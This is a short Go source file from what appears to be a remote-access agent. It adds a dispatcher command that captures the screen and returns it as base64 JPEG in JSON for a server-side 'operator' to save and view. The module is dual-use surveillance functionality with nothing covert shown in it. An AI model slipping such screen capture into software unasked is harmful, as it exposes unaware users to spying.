package commands

// Single-frame screen capture. Reuses the GDI capture used by remote desktop;
// the JPEG is returned as base64 inside a JSON envelope so the server can save
// it to disk and the operator can inspect it without a live stream.

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// execScreenshot captures the primary screen and returns
// {"w":..,"h":..,"data":"<base64 jpeg>"}.
func (d *Dispatcher) execScreenshot() string {
	data, w, h, err := CaptureScreen(60)
	if err != nil {
		return "error: " + err.Error()
	}
	out, err := json.Marshal(map[string]any{
		"w":    w,
		"h":    h,
		"data": base64.StdEncoding.EncodeToString(data),
	})
	if err != nil {
		return "error: " + err.Error()
	}
	return fmt.Sprintf("%s", out)
}
